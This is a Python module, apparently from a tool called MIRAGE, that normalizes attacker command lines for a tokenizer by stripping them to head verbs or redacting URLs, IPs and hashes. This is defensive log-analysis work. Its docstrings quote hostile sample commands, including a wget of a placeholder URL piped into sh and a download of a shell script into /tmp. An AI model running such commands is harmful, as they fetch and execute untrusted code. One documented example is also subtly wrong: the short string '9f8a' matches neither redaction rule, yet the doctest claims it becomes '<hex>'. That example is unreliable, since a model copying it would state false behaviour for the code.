"""Command-line normalization for the MIRAGE tokenizer.

.. note::
   **Reconstructed module.** The original ``normalize.py`` was not present in the
   working tree when the Phase-2 / integration work was assembled, so this file
   was rebuilt faithfully from the behavior documented in the tokenizer module
   and the project README (see the examples below). It is intentionally small and
   transparent; diff it against the canonical Phase-1 version and keep whichever
   you trust -- the public surface (:func:`head_command`, :func:`normalize_full`)
   is what the tokenizer depends on.

Two normalization strategies, matching the tokenizer's two vocabulary modes:

* :func:`head_command` -- the ``"command"`` mode. Reduce a full command line to
  its **head verb**, discarding arguments, leading environment-variable
  assignments, and common wrappers (``sudo``/``env``/...). This collapses
  ``VAR=val sudo /bin/ls -la`` to ``ls`` so the vocabulary is the set of *verbs*
  an attacker uses, not the (effectively infinite) set of full lines.

* :func:`normalize_full` -- the ``"full"`` mode. Keep the whole command line but
  **redact volatile tokens** (URLs, IPv4 addresses, hex blobs, numbers) to fixed
  placeholders, so payload URLs and random ports/hashes do not explode the
  vocabulary while the command *structure* is preserved.
"""

from __future__ import annotations

import re

__all__ = ["head_command", "normalize_full"]

# Leading ``VAR=value`` environment assignments (one or more).
_ENV_ASSIGNMENT = re.compile(r"^[A-Za-z_][A-Za-z0-9_]*=")

# Command wrappers whose *next* argument is the command we actually want.
_WRAPPERS = frozenset(
    {"sudo", "env", "nohup", "time", "exec", "command", "doas", "setsid", "stdbuf"}
)

# Shell control operators that terminate the first command of a line.
_PIPELINE_BREAKS = frozenset({"|", "||", "&&", ";", "&", ">", ">>", "<", "|&"})

# -- Redaction patterns for normalize_full (order matters) ------------------
_URL_RE = re.compile(r"\b[a-zA-Z][a-zA-Z0-9+.\-]*://\S+")
_IPV4_RE = re.compile(r"\b(?:\d{1,3}\.){3}\d{1,3}\b")
_HEX_RE = re.compile(r"\b(?:0x[0-9a-fA-F]+|[0-9a-fA-F]{8,})\b")
_NUM_RE = re.compile(r"\b\d+(?:\.\d+)?\b")
_WS_RE = re.compile(r"\s+")


def _strip_wrappers(tokens: list[str]) -> list[str]:
    """Drop leading env-assignments and command wrappers (with their options).

    ``VAR=1 sudo -u root /bin/ls`` -> ``['/bin/ls']`` (then the caller basenames).
    """
    i = 0
    n = len(tokens)
    while i < n:
        tok = tokens[i]
        if _ENV_ASSIGNMENT.match(tok):
            i += 1
            continue
        if tok in _WRAPPERS:
            i += 1
            # Skip any options belonging to the wrapper (e.g. ``sudo -u root``).
            while i < n and tokens[i].startswith("-"):
                i += 1
                # ``-u root`` style: also skip the option's value if present.
                if i < n and not tokens[i].startswith("-") and tokens[i] not in _WRAPPERS:
                    # Heuristic: a single following value for the flag.
                    i += 1
            continue
        break
    return tokens[i:]


def head_command(raw: str) -> str:
    """Reduce a raw command line to its head verb.

    Args:
        raw: The raw command line as typed by the attacker.

    Returns:
        The lowercased head verb (path-stripped), or ``""`` if the line has no
        resolvable command (empty, pure assignment, or only a wrapper).

    Examples:
        >>> head_command("VAR=val sudo /bin/ls -la")
        'ls'
        >>> head_command("wget http://x/y -O z | sh")
        'wget'
        >>> head_command("   ")
        ''
    """
    stripped = raw.strip()
    if not stripped:
        return ""
    tokens = stripped.split()
    tokens = _strip_wrappers(tokens)
    if not tokens:
        return ""
    head = tokens[0]
    # A pipeline/control operator as the very first token has no verb.
    if head in _PIPELINE_BREAKS:
        return ""
    # Path -> basename (``/usr/bin/python3`` -> ``python3``).
    if "/" in head:
        head = head.rsplit("/", 1)[-1]
    # Strip surrounding quotes/backticks that survive a naive split.
    head = head.strip("'\"`")
    return head.lower()


def normalize_full(raw: str) -> str:
    """Normalize a full command line, redacting volatile tokens to placeholders.

    Redaction order is URL -> IPv4 -> hex -> number so that, e.g., an IP embedded
    in a URL is consumed by the URL rule first.

    Args:
        raw: The raw command line.

    Returns:
        The redacted, whitespace-collapsed command line (``""`` if blank).

    Examples:
        >>> normalize_full("wget http://1.2.3.4:8080/x.sh -O /tmp/9f8a")
        'wget <url> -O /tmp/<hex>'
        >>> normalize_full("chmod 777 /tmp/a")
        'chmod <num> /tmp/a'
    """
    s = raw.strip()
    if not s:
        return ""
    s = _URL_RE.sub("<url>", s)
    s = _IPV4_RE.sub("<ip>", s)
    s = _HEX_RE.sub("<hex>", s)
    s = _NUM_RE.sub("<num>", s)
    s = _WS_RE.sub(" ", s)
    return s.strip()
